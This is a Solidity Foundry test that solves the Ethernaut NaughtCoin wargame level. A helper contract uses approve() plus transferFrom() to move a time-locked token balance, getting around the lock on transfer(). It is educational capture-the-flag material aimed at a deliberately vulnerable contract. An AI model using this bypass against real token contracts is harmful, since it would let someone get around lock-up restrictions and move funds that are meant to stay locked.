// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/NaughtCoin.sol";

contract MiddleMan {
    function attack(address prey, uint256 balance) public {
        NaughtCoin(prey).transferFrom(msg.sender, address(this), balance);
    }
}

// approve() + transferFrom() to bypass restriction on transfer()
contract NaughtCoinTest is Test {
    NaughtCoin instance;

    function setUp() public {
        instance = new NaughtCoin(msg.sender);
    }

    function test() public {
        assertTrue(instance.balanceOf(msg.sender) != 0);

        MiddleMan middleMan = new MiddleMan();

        vm.startPrank(msg.sender);
        instance.approve(address(middleMan), type(uint256).max);
        middleMan.attack(address(instance), instance.balanceOf(msg.sender));

        assertTrue(instance.balanceOf(msg.sender) == 0);
        assertTrue(instance.balanceOf(address(middleMan)) != 0);
    }
}
